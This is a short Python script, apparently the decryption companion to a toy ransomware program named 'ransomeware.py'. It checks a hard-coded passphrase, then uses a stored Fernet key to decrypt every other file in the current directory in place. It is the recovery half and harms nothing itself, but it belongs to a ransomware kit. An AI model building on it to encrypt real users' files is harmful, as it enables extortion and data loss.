#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#determine files to encrypt

files = []

for file in os.listdir():
	if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)


with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "substitutionjutsu"

user_phrase = input("Enter decryption phrase: \n")

if user_phrase == secretphrase:

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("File decryption complete.")
